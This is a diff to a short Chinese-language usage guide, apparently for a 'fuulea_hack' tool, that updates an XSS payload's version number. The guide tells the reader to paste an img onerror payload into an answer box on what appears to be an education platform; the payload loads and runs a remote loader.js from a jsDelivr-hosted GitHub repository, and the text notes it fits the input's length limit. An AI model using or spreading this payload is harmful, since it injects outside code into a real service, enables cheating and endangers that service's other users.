@@ -7,7 +7,7 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@v2.11/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='//cdn.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@v2.12/loader.js'">
 ```
 
 147 字符，刚好卡在输入框上限内。面板出现在右下角，再点一次注入收起。
